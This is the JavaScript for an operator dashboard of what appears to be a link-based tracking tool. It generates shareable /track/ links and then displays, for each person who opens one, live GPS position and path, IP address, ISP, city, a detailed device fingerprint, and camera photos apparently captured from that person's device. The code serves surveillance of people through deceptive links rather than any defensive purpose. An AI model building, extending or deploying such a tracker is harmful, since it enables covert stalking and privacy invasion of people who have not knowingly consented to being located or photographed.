// ── State ────────────────────────────────────────────────────
let map;
let trackers = [];
let selectedTrackerId = null;
let markers = {};
let polylines = {};
let socket;

// ── Init ─────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  initMap();
  initSocket();
  loadTrackers();
  startClock();
});

// ── Map ──────────────────────────────────────────────────────
function initMap() {
  map = L.map('map', {
    center: [20, 0],
    zoom: 2,
    zoomControl: true
  });

  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    attribution: '&copy; OpenStreetMap &copy; CARTO',
    maxZoom: 19
  }).addTo(map);

  // Fix map size on load
  setTimeout(() => map.invalidateSize(), 100);
  window.addEventListener('resize', () => map.invalidateSize());
}

// ── Socket ───────────────────────────────────────────────────
function initSocket() {
  socket = io({
    transports: ['websocket', 'polling']
  });
  const statusEl = document.getElementById('connection-status');

  socket.on('connect', () => {
    statusEl.textContent = 'Connected (Real-time)';
    statusEl.className = 'badge badge-green';
    trackers.forEach(t => socket.emit('watch-tracker', t.id));
  });

  socket.on('disconnect', () => {
    statusEl.textContent = 'Polling mode';
    statusEl.className = 'badge badge-gray';
  });

  socket.on('location-received', (data) => {
    const { trackerId, location } = data;
    updateMarker(trackerId, location);
    if (selectedTrackerId === trackerId) {
      updateDetailPanel(trackerId);
    }
  });

  socket.on('tracker-updated', (tracker) => {
    const idx = trackers.findIndex(t => t.id === tracker.id);
    if (idx >= 0) {
      trackers[idx] = { ...trackers[idx], ...tracker };
    } else {
      trackers.push(tracker);
      socket.emit('watch-tracker', tracker.id);
    }
    renderTrackerList();
    updateStats();
    if (selectedTrackerId === tracker.id) {
      updateDetailPanel(tracker.id);
    }
  });

  socket.on('tracker-deleted', (id) => {
    trackers = trackers.filter(t => t.id !== id);
    removeMarker(id);
    renderTrackerList();
    updateStats();
    if (selectedTrackerId === id) {
      selectedTrackerId = null;
      document.getElementById('detail-panel').classList.add('hidden');
    }
  });

  socket.on('photo-received', (data) => {
    if (selectedTrackerId === data.trackerId) {
      updateDetailPanel(data.trackerId);
    }
  });

  // Polling Fallback: Refresh data every 5 seconds if socket is disconnected or just as extra sync
  setInterval(() => {
    loadTrackers();
    if (selectedTrackerId) {
      updateDetailPanel(selectedTrackerId);
    }
  }, 5000);
}

// ── API Calls ────────────────────────────────────────────────
async function loadTrackers() {
  try {
    const res = await fetch('/api/trackers');
    trackers = await res.json();
    renderTrackerList();
    updateStats();
    // Place existing markers
    trackers.forEach(t => {
      if (t.lastLocation) {
        updateMarker(t.id, t.lastLocation);
      }
      socket.emit('watch-tracker', t.id);
    });
  } catch (e) {
    console.error('Failed to load trackers:', e);
  }
}

async function createTracker() {
  document.getElementById('create-modal').classList.remove('hidden');
  document.getElementById('tracker-name').focus();
}

async function submitCreateTracker() {
  const name = document.getElementById('tracker-name').value.trim();
  try {
    const res = await fetch('/api/tracker/create', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: name || undefined })
    });
    const data = await res.json();
    if (data.success) {
      closeModal();
      document.getElementById('tracker-name').value = '';
      document.getElementById('generated-link').value = data.link;
      document.getElementById('link-modal').classList.remove('hidden');
      trackers.push(data.tracker);
      socket.emit('watch-tracker', data.tracker.id);
      renderTrackerList();
      updateStats();
    }
  } catch (e) {
    showToast('Failed to create tracker', 'error');
  }
}

async function deleteTracker() {
  if (!selectedTrackerId) return;
  if (!confirm('Delete this tracker? All data will be lost.')) return;
  try {
    await fetch(`/api/tracker/${selectedTrackerId}`, { method: 'DELETE' });
    selectedTrackerId = null;
    document.getElementById('detail-panel').classList.add('hidden');
    showToast('Tracker deleted');
  } catch (e) {
    showToast('Failed to delete tracker', 'error');
  }
}

// ── Markers ──────────────────────────────────────────────────
function updateMarker(trackerId, location) {
  const tracker = trackers.find(t => t.id === trackerId);
  const name = tracker?.name || trackerId;

  if (markers[trackerId]) {
    markers[trackerId].setLatLng([location.latitude, location.longitude]);
  } else {
    const icon = L.divIcon({
      className: 'custom-marker',
      html: `<div class="marker-dot ${tracker?.active ? 'active' : ''}"></div>
             <div class="marker-label">${name}</div>`,
      iconSize: [20, 20],
      iconAnchor: [10, 10]
    });
    markers[trackerId] = L.marker([location.latitude, location.longitude], { icon }).addTo(map);
    markers[trackerId].on('click', () => selectTracker(trackerId));
  }

  // Draw path
  if (!polylines[trackerId]) {
    polylines[trackerId] = L.polyline([], {
      color: '#6366f1',
      weight: 2,
      opacity: 0.6,
      dashArray: '5, 8'
    }).addTo(map);
  }
  polylines[trackerId].addLatLng([location.latitude, location.longitude]);
}

function removeMarker(trackerId) {
  if (markers[trackerId]) {
    map.removeLayer(markers[trackerId]);
    delete markers[trackerId];
  }
  if (polylines[trackerId]) {
    map.removeLayer(polylines[trackerId]);
    delete polylines[trackerId];
  }
}

// ── UI ───────────────────────────────────────────────────────
function renderTrackerList() {
  const container = document.getElementById('tracker-list');
  if (trackers.length === 0) {
    container.innerHTML = '<div class="empty-state">No trackers yet. Create one to start.</div>';
    return;
  }

  container.innerHTML = trackers.map(t => `
    <div class="tracker-item ${t.id === selectedTrackerId ? 'selected' : ''}" onclick="selectTracker('${t.id}')">
      <div class="tracker-item-header">
        <span class="tracker-dot ${t.active ? 'active' : 'inactive'}"></span>
        <span class="tracker-name">${escapeHtml(t.name)}</span>
      </div>
      <div class="tracker-meta">
        ${t.lastLocation ? formatTime(t.lastLocation.timestamp) : 'No data'}
        ${t.locationCount !== undefined ? ` · ${t.locationCount} pts` : ''}
      </div>
    </div>
  `).join('');
}

function selectTracker(trackerId) {
  selectedTrackerId = trackerId;
  const tracker = trackers.find(t => t.id === trackerId);
  if (!tracker) return;

  renderTrackerList();
  updateDetailPanel(trackerId);
  document.getElementById('detail-panel').classList.remove('hidden');

  if (tracker.lastLocation) {
    map.flyTo([tracker.lastLocation.latitude, tracker.lastLocation.longitude], 15, { duration: 1 });
  }
}

async function updateDetailPanel(trackerId) {
  let tracker;
  try {
    const res = await fetch(`/api/tracker/${trackerId}`);
    tracker = await res.json();
  } catch (e) {
    return;
  }

  document.getElementById('detail-name').textContent = tracker.name;
  document.getElementById('detail-status').innerHTML = tracker.active
    ? '<span class="badge badge-green">Online</span>'
    : '<span class="badge badge-gray">Offline</span>';
  document.getElementById('detail-last-update').textContent = tracker.lastLocation
    ? formatTime(tracker.lastLocation.timestamp) : '—';
  document.getElementById('detail-coords').textContent = tracker.lastLocation
    ? `${tracker.lastLocation.latitude.toFixed(6)}, ${tracker.lastLocation.longitude.toFixed(6)}` : '—';
  document.getElementById('detail-accuracy').textContent = tracker.lastLocation?.accuracy
    ? `±${Math.round(tracker.lastLocation.accuracy)}m` : '—';
  document.getElementById('detail-speed').textContent = tracker.lastLocation?.speed != null
    ? `${(tracker.lastLocation.speed * 3.6).toFixed(1)} km/h` : '—';
  document.getElementById('detail-device').textContent = tracker.deviceInfo
    ? `${tracker.deviceInfo.platform || ''} ${tracker.deviceInfo.browser || ''}` : '—';

  // Device & Network Details
  const di = tracker.deviceInfo || {};
  document.getElementById('detail-device-name').textContent = di.deviceName || '—';
  document.getElementById('detail-browser').textContent = di.browser || '—';
  document.getElementById('detail-ip').textContent = di.ipAddress || '—';
  document.getElementById('detail-isp').textContent = di.isp || '—';
  document.getElementById('detail-location').textContent = di.city
    ? `${di.city}, ${di.region || ''}, ${di.postal || ''}`.replace(/,\s*$/, '') : '—';
  document.getElementById('detail-country').textContent = di.country
    ? `${di.country}${di.countryCode ? ` (${di.countryCode})` : ''}` : '—';
  document.getElementById('detail-screen').textContent = di.screen || '—';
  document.getElementById('detail-language').textContent = di.language || '—';
  document.getElementById('detail-cores').textContent = di.cores || '—';
  document.getElementById('detail-ram').textContent = di.ram || '—';
  document.getElementById('detail-touch').textContent = di.touch || '—';
  document.getElementById('detail-timezone').textContent = di.timezone || '—';

  // Location history
  const histEl = document.getElementById('location-history');
  if (tracker.locations?.length > 0) {
    histEl.innerHTML = tracker.locations.slice(-20).reverse().map(loc => `
      <div class="history-item">
        <div class="history-coords">${loc.latitude.toFixed(5)}, ${loc.longitude.toFixed(5)}</div>
        <div class="history-time">${formatTime(loc.timestamp)}</div>
      </div>
    `).join('');
  } else {
    histEl.innerHTML = '<div class="empty-state">No location data yet</div>';
  }

  // Photos
  const photoEl = document.getElementById('photo-grid');
  if (tracker.photos?.length > 0) {
    photoEl.innerHTML = tracker.photos.slice(-12).reverse().map(p => `
      <div class="photo-item" onclick="window.open('${p.image}', '_blank')">
        <img src="${p.image}" alt="Capture" loading="lazy" />
        <div class="photo-meta">${p.facing || 'camera'} · ${formatTime(p.timestamp)}</div>
      </div>
    `).join('');
  } else {
    photoEl.innerHTML = '<div class="empty-state">No photos captured yet</div>';
  }
}

function updateStats() {
  document.getElementById('stat-total').textContent = trackers.length;
  document.getElementById('stat-active').textContent = trackers.filter(t => t.active).length;
  document.getElementById('stat-locations').textContent = trackers.reduce((s, t) => s + (t.locationCount || 0), 0);
  document.getElementById('stat-photos').textContent = trackers.reduce((s, t) => s + (t.photoCount || 0), 0);
}

// ── Modals ───────────────────────────────────────────────────
function closeModal() {
  document.getElementById('create-modal').classList.add('hidden');
}

function closeLinkModal() {
  document.getElementById('link-modal').classList.add('hidden');
}

function copyLink() {
  const link = document.getElementById('generated-link').value;
  navigator.clipboard.writeText(link);
  showToast('Link copied to clipboard!');
}

function copyTrackerLink() {
  if (!selectedTrackerId) return;
  const tracker = trackers.find(t => t.id === selectedTrackerId);
  if (!tracker) return;
  const link = `${window.location.origin}/track/${selectedTrackerId}`;
  navigator.clipboard.writeText(link);
  showToast('Tracking link copied!');
}

// ── Helpers ──────────────────────────────────────────────────
function formatTime(ts) {
  if (!ts) return '—';
  const d = new Date(ts);
  const now = new Date();
  const diff = (now - d) / 1000;
  if (diff < 60) return 'Just now';
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  return d.toLocaleString();
}

function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

function startClock() {
  function tick() {
    document.getElementById('current-time').textContent = new Date().toLocaleString();
  }
  tick();
  setInterval(tick, 1000);
}

function showToast(message, type = 'success') {
  const toast = document.getElementById('toast');
  toast.textContent = message;
  toast.className = `toast ${type === 'error' ? 'toast-error' : ''}`;
  toast.classList.remove('hidden');
  setTimeout(() => toast.classList.add('hidden'), 3000);
}

// Close modals on overlay click
document.querySelectorAll('.modal-overlay').forEach(overlay => {
  overlay.addEventListener('click', (e) => {
    if (e.target === overlay) overlay.classList.add('hidden');
  });
});
